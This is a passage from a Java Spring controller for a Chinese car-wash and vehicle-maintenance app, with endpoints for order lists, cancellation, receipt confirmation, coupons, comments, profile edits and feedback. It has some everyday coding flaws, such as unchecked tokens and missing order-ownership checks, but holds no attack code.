			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.status=?2 and o.member.id=?3 and o.isPay=?4");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(0); // 已完结的订单
			params.add(uid);
			params.add(true);
			List<Order> orders = orderService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby).getResultList();
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (Order order : orders) {
				/**
				 * 已完结 0 <br>
				 * 洗车服务订单状态 1派单中 2路途中 3服务中 1-9洗车状态 <br>
				 * 保养服务订单状态 11 预约成功 12 已分配车队 11-19 保养服务状态<br>
				 * 纯商品订单状态 21已下单 22配货中 23送货中 21-29 纯商品订单状态 <br>
				 * 取消订单状态 31待审核 32 审核中 33 退款中 34已退款 35未通过 36已完结【待定】 31-39取消订单状态<br>
				 */
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("oid", order.getId());
				map.put("onum", order.getNum());
				map.put("otype", order.getType());
				map.put("ostatus", order.getStatusString());
				map.put("oprice", order.getPrice() + "");
				map.put("ocomt", 1);

				if (order.getType() == 1 && order.getStatus() == 2
						&& order.getTechMember() != null) { // 洗车订单并且技师已接单（路途中表示已接单）
					map.put("ocontact", "服务技师："
							+ order.getTechMember().getName());
					map.put("ophone", "联系电话："
							+ order.getTechMember().getPhonenumber());
					map.put("ostar",
							Math.round(order.getTechMember().getLevel() * 2)
									+ "");
				} else if (order.getType() == 2 && order.getStatus() == 12
						&& order.getCarTeam() != null) {// 保养订单并且已分配车队
					map.put("ocontact", "车队联系人："
							+ order.getCarTeam().getHeadMember());
					map.put("ophone", "联系电话："
							+ order.getCarTeam().getHeadPhone());
					map.put("ophone", "");
				} else {
					map.put("ocontact", "");
					map.put("ophone", "");
					map.put("ophone", "");
				}

				List<Map<String, Object>> sclist = new ArrayList<Map<String, Object>>();
				if (order.getType() == 1) {// 洗车订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					scmap.put("sccomt", 0); // 洗车服务-》转商品，这里不能进行评论
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", so.getId()); // 为评论准备 ID数据
						spmap.put("pimg", so.getServiceType().getImgPath());
						spmap.put("pname", so.getName());
						spmap.put("premark", so.getServiceType().getRemark2());//
						spmap.put("pprice", so.getPrice());
						spmap.put("pnum", 0);
						spmap.put("pcomt", so.getComment() == null ? 1 : 0);// 能否评论商品：洗车类型特指能否评论洗车服务
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				} else if (order.getType() == 2) {// 保养类订单
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> scmap = new LinkedHashMap<String, Object>();
						scmap.put("scid", so.getId()); // 为评论准备 ID数据
						scmap.put("scimg", so.getServiceType().getImgPath());
						scmap.put("scname", so.getName());
						scmap.put("scprice", so.getPrice());
						scmap.put("sccomt", so.getComment() == null ? 1 : 0); // 能否评论服务
						List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
						for (ServerOrderDetail sod : so.getServerOrderDetail()) {
							Map<String, Object> spmap = new LinkedHashMap<String, Object>();
							spmap.put("pid", sod.getId());// //为评论准备 ID数据
							spmap.put("pimg", sod.getProduct().getImgPath());
							spmap.put("pname", sod.getName());
							spmap.put("premark", "");
							spmap.put("pprice", sod.getPrice() == null ? 0
									: sod.getPrice());
							spmap.put(
									"pnum",
									sod.getCount() == null ? 0 : Math.round(sod
											.getCount()));
							spmap.put("pcomt", sod.getComment() == null ? 1 : 0);// 能否评论商品
							plist.add(spmap);
						}
						scmap.put("plist", plist);
						sclist.add(scmap);
					}
				} else {// 纯商品订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					scmap.put("sccomt", 0); // 能否评论服务
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrderDetail sod : order.getServerOrderDetail()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", sod.getId());// 为评论准备 ID数据
						spmap.put("pimg", sod.getProduct().getImgPath());
						spmap.put("pname", sod.getName());
						spmap.put("premark", "");
						spmap.put("pprice",
								sod.getPrice() == null ? 0 : sod.getPrice());
						spmap.put(
								"pnum",
								sod.getCount() == null ? 0 : Math.round(sod
										.getCount()));
						spmap.put("pcomt", sod.getComment() == null ? 1 : 0);// 能否评论商品
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				}
				map.put("sclist", sclist);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 查询已取消的订单列表 取消类型
	 * 
	 * @param type
	 *            1=待审核、2=审核中 3=退款中、4=已完结
	 * @return
	 */
	@RequestMapping(value = "/user/order/cancel", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderCancel(String uid, String token, int page, int maxresult,
			int type) {
		try {
			log.info("App【获取用户下已完结的订单列表】：" + "uid=" + uid + " token=" + token
					+ " type=" + type);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 */
			PageView<Order> pageView = new PageView<Order>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("createDate", "desc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.member.id=?2 and o.isPay=?3");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(uid);
			params.add(true);
			if (type == 1) {// 待审核
				jpql.append(" and o.status=?4");
				params.add(31);
			} else if (type == 2) {// 审核中
				jpql.append(" and o.status=?4");
				params.add(32);
			} else if (type == 3) {// 退款中
				jpql.append(" and o.status=?4");
				params.add(33);
			} else if (type == 4) {// 已完结
				jpql.append(" and (o.status=?4 or o.status=?5)");
				params.add(34);
				params.add(35);
			}
			List<Order> orders = orderService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby).getResultList();

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (Order order : orders) {
				/**
				 * 已完结 0 <br>
				 * 洗车服务订单状态 1派单中 2路途中 3服务中 1-9洗车状态 <br>
				 * 保养服务订单状态 11 预约成功 12 已分配车队 11-19 保养服务状态<br>
				 * 纯商品订单状态 21已下单 22配货中 23送货中 21-29 纯商品订单状态 <br>
				 * 取消订单状态 31待审核 32 审核中 33 退款中 34已退款 35未通过 36已完结【待定】 31-39取消订单状态<br>
				 */
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("oid", order.getId());
				map.put("onum", order.getNum());
				map.put("otype", order.getType());
				map.put("ostatus", order.getStatusString());
				map.put("oprice", order.getPrice() + "");
				if (order.getStatus() == 35) { // 未通过 可“取消订单”
					map.put("ocanop", 1);
				} else {
					map.put("ocanop", 0);
				}
				if (order.getType() == 1 && order.getStatus() == 2
						&& order.getTechMember() != null) { // 洗车订单并且技师已接单（路途中表示已接单）
					map.put("ocontact", "服务技师："
							+ order.getTechMember().getName());
					map.put("ophone", "联系电话："
							+ order.getTechMember().getPhonenumber());
					map.put("ostar",
							Math.round(order.getTechMember().getLevel() * 2)
									+ "");
				} else if (order.getType() == 2 && order.getStatus() == 12
						&& order.getCarTeam() != null) {// 保养订单并且已分配车队
					map.put("ocontact", "车队联系人："
							+ order.getCarTeam().getHeadMember());
					map.put("ophone", "联系电话："
							+ order.getCarTeam().getHeadPhone());
					map.put("ostar", "");
				} else {
					map.put("ocontact", "");
					map.put("ophone", "");
					map.put("ostar", "");
				}

				List<Map<String, Object>> sclist = new ArrayList<Map<String, Object>>();
				if (order.getType() == 1) {// 洗车订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", so.getServiceType().getId()); // 对应服务ID
						spmap.put("pimg", so.getServiceType().getImgPath());
						spmap.put("pname", so.getName());
						spmap.put("premark", so.getServiceType().getRemark2());//
						spmap.put("pprice", so.getPrice());
						spmap.put("pnum", 0);
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				} else if (order.getType() == 2) {// 保养类订单
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> scmap = new LinkedHashMap<String, Object>();
						scmap.put("scid", so.getServiceType().getId());
						scmap.put("scimg", so.getServiceType().getImgPath());
						scmap.put("scname", so.getName());
						scmap.put("scprice", so.getPrice());
						scmap.put("sccomt", 0); // 能否评论服务
						List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
						for (ServerOrderDetail sod : so.getServerOrderDetail()) {
							Map<String, Object> spmap = new LinkedHashMap<String, Object>();
							spmap.put("pid", sod.getProduct().getId());// 对应于商品ID
							spmap.put("pimg", sod.getProduct().getImgPath());
							spmap.put("pname", sod.getName());
							spmap.put("premark", "");
							spmap.put("pprice", sod.getPrice() == null ? 0
									: sod.getPrice());
							spmap.put(
									"pnum",
									sod.getCount() == null ? 0 : Math.round(sod
											.getCount()));
							plist.add(spmap);
						}
						scmap.put("plist", plist);
						sclist.add(scmap);
					}
				} else {// 纯商品订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrderDetail sod : order.getServerOrderDetail()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", sod.getProduct().getId());// 对应于商品ID
						spmap.put("pimg", sod.getProduct().getImgPath());
						spmap.put("pname", sod.getName());
						spmap.put("premark", "");
						spmap.put("pprice",
								sod.getPrice() == null ? 0 : sod.getPrice());
						spmap.put(
								"pnum",
								sod.getCount() == null ? 0 : Math.round(sod
										.getCount()));
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				}
				map.put("sclist", sclist);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 用户【取消订单】
	 */
	@RequestMapping(value = "/user/order/op/cancel", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderOpCancel(String uid, String token, String oid) {
		try {
			log.info("App【用户取消订单】：" + "oid=" + oid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Order order = orderService.find(oid);
			if (!order.getMember().getId().equals(uid)) {// 非自己的订单
				dataMap.put("result", "105");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			if (order.getStatus() == 1 || order.getStatus() == 11
					|| order.getStatus() == 21 || order.getStatus() == 35) { // 在这些状态下才能取消订单
				order.setStatus(31);
				orderService.update(order);
				dataMap.put("result", "001");
			} else {
				dataMap.put("result", "109");// 用户不能取消订单
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 用户【确认收货】
	 */
	@RequestMapping(value = "/user/order/op/confirm", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderOpConfirm(String uid, String token, String oid) {
		try {
			log.info("App【用户确认收货】：" + "oid=" + oid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Order order = orderService.find(oid);
			if (!order.getMember().getId().equals(uid)) {// 非自己的订单
				dataMap.put("result", "105");
			}
			if (order.getStatus() == 23) { // 配货中才能确认收货
				order.setStatus(0); //
				orderService.update(order);
				Member member = memberService.find(uid);
				/** 处理积分 */
				float gainScore = 0;
				if (order.getServerOrderDetail().size() > 0) {
					for (ServerOrderDetail sod : order.getServerOrderDetail()) {
						Product product = sod.getProduct();
						float productScore = CommonUtil.mul(
								sod.getCount() + "", product.getPoint() + "");
						gainScore = CommonUtil.add(member.getAmount() + "",
								productScore + "");
					}
				}
				member.setAmount(CommonUtil.add(member.getAmount() + "",
						gainScore + ""));
				memberService.update(member);// 更新用户积分
				log.info("App【用户确认收货】，获取积分为：" + gainScore);
				// 首次消费送优惠券
				firstSpendSendCouponService.gainCoupon(order);

				dataMap.put("result", "001");
			} else {
				dataMap.put("result", "110");
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 洗车订单详情
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/order/carwash/detail", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderCarwashDetail(String uid, String token, String oid) {
		try {
			log.info("App【获取用户下在进行的订单列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Order order = orderService.find(oid);
			if (order.getType() != 1) {// 非洗车订单
				dataMap.put("result", "113"); // 订单请求类型错误
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			dataMap.put("onum", order.getNum());
			dataMap.put("ostatus", order.getStatusString());
			dataMap.put("ocontact", order.getContact());
			dataMap.put("ophone", order.getPhone());
			dataMap.put("ocmname", order.getCar().getName());
			dataMap.put("ocleanType", order.getCleanType() + "");// 清洗方式 1 内部清洗
																	// 2 内外清洗
			dataMap.put("oplateNum", order.getCarNum());
			dataMap.put("ocarcolor", order.getCarColor());

			ServerOrder serverOrder = null;
			for (ServerOrder so : order.getServerOrder()) {
				serverOrder = so;
				break;
			}
			dataMap.put("osimgpath", serverOrder.getServiceType().getImgPath());
			dataMap.put("osname", serverOrder.getName());
			dataMap.put("osremark", serverOrder.getServiceType().getRemark1());
			dataMap.put("osprice", serverOrder.getPrice() + "");

			dataMap.put("address", order.getAddress());
			dataMap.put("lat", order.getLat());
			dataMap.put("lng", order.getLng());
			dataMap.put("payway", order.getPayWay() + "");
			dataMap.put("usecoup", order.getMemberCoupon() != null ? "已使用"
					: "未使用");
			dataMap.put("orimoney", order.getAmount_money() + "");
			dataMap.put("cpmoney", order.getAmount_paid() + "");
			dataMap.put("paymoney", order.getPrice() + "");

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 保养服务订单详情
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/order/server/detail", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderServerDetail(String uid, String token, String oid) {
		try {
			log.info("App【获取用户下在进行的订单列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Order order = orderService.find(oid);
			if (order.getType() != 2) {// 非保养订单
				dataMap.put("result", "113"); // 订单请求类型错误
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日");
			SimpleDateFormat sdfSDate = new SimpleDateFormat("MM月dd日");
			SimpleDateFormat sdfSTime = new SimpleDateFormat("HH:mm");
			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			dataMap.put("onum", order.getNum());
			dataMap.put("ostatus", order.getStatusString());
			dataMap.put("ocontact", order.getContact());
			dataMap.put("ophone", order.getPhone());
			dataMap.put("ocmname", order.getCar().getName());
			dataMap.put("odate", sdf.format(order.getCreateDate()));
			dataMap.put("oplateNum", order.getCarNum());
			dataMap.put("ocarcolor", order.getCarColor());
			dataMap.put("address", order.getAddress());
			dataMap.put("lat", order.getLat());
			dataMap.put("lng", order.getLng());
			dataMap.put("payway", order.getPayWay() + "");
			dataMap.put("usecoup", order.getMemberCoupon() != null ? "已使用"
					: "未使用");
			try {
				dataMap.put("stime", sdfSDate.format(order.getStartDate())
						+ " " + sdfSTime.format(order.getStartDate()) + "-"
						+ sdfSTime.format(order.getEndDate()));
			} catch (Exception e) {
				dataMap.put("stime", "");
			}

			float opmoney = 0;
			float ocmoney = 0;
			List<Map<String, Object>> sclist = new ArrayList<Map<String, Object>>();
			for (ServerOrder so : order.getServerOrder()) {
				Map<String, Object> scmap = new LinkedHashMap<String, Object>();
				scmap.put("scimg", so.getServiceType().getImgPath());
				scmap.put("scname", so.getName());
				scmap.put("scprice", so.getPrice());
				List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
				for (ServerOrderDetail sod : so.getServerOrderDetail()) {
					Map<String, Object> spmap = new LinkedHashMap<String, Object>();
					spmap.put("pimg", sod.getProduct().getImgPath());
					spmap.put("pname", sod.getName());
					spmap.put("pprice", sod.getPrice() + "");
					spmap.put("pnum", Math.round(sod.getCount()) + "");
					plist.add(spmap);
					float sodprice = CommonUtil.mul(sod.getPrice() + "",
							sod.getCount() + "");
					opmoney = CommonUtil.add(opmoney + "", sodprice + "");
				}
				scmap.put("plist", plist);
				sclist.add(scmap);
				ocmoney = CommonUtil.add(ocmoney + "", so.getPrice() + "");
			}
			dataMap.put("opmoney", opmoney + "");
			dataMap.put("ocmoney", ocmoney + "");
			dataMap.put("cpmoney", order.getAmount_paid() + "");
			dataMap.put("paymoney", order.getPrice() + "");
			dataMap.put("sclist", sclist);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 商品订单详情
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/order/product/detail", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderProductDetail(String uid, String token, String oid) {
		try {
			log.info("App【获取用户下在进行的订单列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Order order = orderService.find(oid);
			if (order.getType() != 3) {// 非商品订单
				dataMap.put("result", "113"); // 订单请求类型错误
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日");
			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			dataMap.put("onum", order.getNum());
			dataMap.put("ostatus", order.getStatusString());
			dataMap.put("ocontact", order.getContact());
			dataMap.put("ophone", order.getPhone());
			try {
				dataMap.put("ocmname", order.getCar().getName());
			} catch (Exception e) {
				dataMap.put("ocmname", "");
			}
			dataMap.put("odate", sdf.format(order.getCreateDate()));
			dataMap.put("oplateNum", order.getCarNum());
			dataMap.put("ocarcolor", order.getCarColor());

			ServerOrderDetail serverOrderDetail = null;
			for (ServerOrderDetail sod : order.getServerOrderDetail()) {
				serverOrderDetail = sod;
			}
			dataMap.put("opimgpath", serverOrderDetail.getProduct()
					.getImgPath());
			dataMap.put("opname", serverOrderDetail.getName());
			dataMap.put("oprice", serverOrderDetail.getPrice() + "");
			dataMap.put("opnum", Math.round(serverOrderDetail.getCount()) + "");

			if (order.getArea() != null) {
				dataMap.put("address",
						areaService.fullAreaName(order.getArea().getId())
								+ order.getAddress());
			} else {
				dataMap.put("address", order.getAddress());
			}
			dataMap.put("lat", order.getLat());
			dataMap.put("lng", order.getLng());
			dataMap.put("payway", order.getPayWay() + "");
			dataMap.put("usecoup", order.getMemberCoupon() != null ? "已使用"
					: "未使用");
			dataMap.put("orimoney", order.getAmount_money() + "");
			dataMap.put("cpmoney", order.getAmount_paid() + "");
			dataMap.put("paymoney", order.getPrice() + "");

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取系统的优惠券
	 */
	@RequestMapping(value = "/user/coupon/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCouponList(String uid, String token) {
		try {
			log.info("App【获取系统优惠券】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("point", "asc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.isEnabled=?2 and o.isExchange=?3 and (o.endDate>=?4 or o.endDate is null)");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(true);
			params.add(true);
			params.add(new Date());

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Coupon> couponList = couponService.getScrollData(0, 20,
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (Coupon cp : couponList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cpid", cp.getId());
				map.put("cptype", cp.getType());
				map.put("cpname", cp.getName());
				map.put("cpintroduction", cp.getIntroduction());
				map.put("cpimg", cp.getImgPath2()); // 兑换图
				map.put("cpexscore",
						cp.getPoint() == null ? "0" : cp.getPoint() + "");
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("score", memberService.find(uid).getAmount() + "");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取用户当前领取的优惠券
	 */
	@RequestMapping(value = "user/coupon/exchange/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCouponExchangeList(String uid, String token, int page,
			int maxresult, int type) {
		try {
			log.info("App【获取用户领取的优惠券】：" + "uid=" + uid + " token=" + token
					+ "page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			PageView<MemberCoupon> pageView = new PageView<MemberCoupon>(
					maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.member.id=?2 and o.status=?3");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(uid);
			params.add(0);// 未使用
			if (type == 1) {// 查询未过期的
				jpql.append(" and (o.endDate>=?4 or o.endDate is null)");
				params.add(new Date());
			} else if (type == 0) {// 查询过期的
				jpql.append(" and o.endDate<?4 ");
				params.add(new Date());
			}
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			pageView.setQueryResult(memberCouponService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<MemberCoupon> mcs = pageView.getRecords();
			for (MemberCoupon mc : mcs) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cpid", mc.getId());
				map.put("cptype", mc.getType());
				map.put("cpname", mc.getName());
				map.put("cpintroduction", mc.getIntroduction());
				map.put("cpimg", mc.getImgPath());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 兑换优惠券
	 * 
	 */
	@RequestMapping(value = "/user/coupon/exchange", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCouponExchange(String uid, String token, String cpid) {
		try {
			log.info("App【用户兑换优惠券】：" + "cpid=" + cpid);
			int exchangeResult = memberCouponService.exchange(uid, cpid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			if (exchangeResult == 1) {// 兑换成功
				dataMap.put("result", "001");
			} else if (exchangeResult == 0) {// 积分不足
				dataMap.put("result", "108");
			} else {// 兑换招出异常
				dataMap.put("result", "000");
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 上传图片
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/comment/upload", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCommentUpload(String uid, String token, MultipartFile imageFile) {
		try {
			log.info("App【上传图片】：" + "uid=" + uid + " imageFile="
					+ imageFile.getSize() + " "
					+ imageFile.getOriginalFilename());
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Map<String, String> map = UploadImageUtil.uploadFile(imageFile,
					request);
			String url = map.get("source");
			dataMap.put("result", "001");
			dataMap.put("imgurl", url);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 保存评论
	 * 
	 * @param uid
	 * @param token
	 * @param imgurl
	 *            图片路径地址，多个以#分隔
	 * @param content
	 * @param oid
	 * @param pid
	 *            ServerOder 为ServerOrderDeatai ID
	 * @param type
	 *            1=评论商品；2=评论服务
	 * @return
	 */
	@RequestMapping(value = "/user/comment/save", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCommentSave(String uid, String token,
			@RequestParam(required = false) String imgurl, int star,
			String content, String oid, String pid, int type) {
		try {
			log.info("App【保存评论】：" + "content=" + content);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Member member = memberService.find(uid);
			Comment comment = new Comment();

			if (type == 1) {// 评论商品
				ServerOrderDetail serverOrderDetail = serverOrderDetailService
						.find(pid);
				if (serverOrderDetail.getComment() != null) {
					dataMap.put("result", "112"); // 已评价过
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				} else {
					comment.setServerOrderDetail(serverOrderDetail);
					comment.setContent(content);
					comment.setStar(star);
					comment.setMember(member);
					commentService.save(comment);
					serverOrderDetail.setComment(comment);
					serverOrderDetailService.update(serverOrderDetail);
				}
			} else if (type == 2) {// 评论服务
				ServerOrder serverOrder = serverOrderService.find(pid);
				if (serverOrder.getComment() != null) {
					dataMap.put("result", "112"); // 已评价过
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				} else {
					comment.setServerOrder(serverOrder);
					comment.setContent(content);
					comment.setStar(star);
					comment.setMember(member);
					commentService.save(comment);
					serverOrder.setComment(comment);
					serverOrderService.update(serverOrder);
				}
			}

			if (imgurl != null && imgurl.length() > 0) {
				String[] imgs = imgurl.split("#");
				for (String imgPath : imgs) {
					CommentImg ci = new CommentImg();
					ci.setComment(comment);
					ci.setImgPath(imgPath);
					commentImgService.save(ci);
				}
			}
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取个人资料
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/profile", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userProfile(String uid, String token) {
		try {
			log.info("App【修改个人资料】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Member member = memberService.find(uid);
			memberService.update(member);
			dataMap.put("result", "001");
			dataMap.put("nickname", member.getNickname());
			dataMap.put("photo", member.getPhoto());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 修改个人资料
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/profile/edit", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userProfileEdit(String uid, String token,
			@RequestParam(required = false) MultipartFile photo,
			@RequestParam(required = false) String nickname) {
		try {
			log.info("App【修改个人资料】：" + "uid=" + uid + " token=" + token
					+ "nickname=" + nickname + " photo=" + photo);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Member member = memberService.find(uid);
			if (nickname != null && !"".equals(nickname)) {
				member.setNickname(nickname);
			}
			if (photo != null) {
				Map<String, String> map = UploadImageUtil.uploadFile(photo,
						request);
				member.setPhoto(map.get("source"));
			}
			memberService.update(member);
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 提交反馈信息
	 */
	@RequestMapping(value = "/user/feedback", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userFeedback(String uid, String token, String content) {
		try {
			log.info("App【用户反馈】：" + "content=" + content);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Feedback feedback = new Feedback();
			feedback.setContent(content);
			feedback.setMember(memberService.find(uid));
			feedbackService.save(feedback);
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取用户充值编号
	 * 
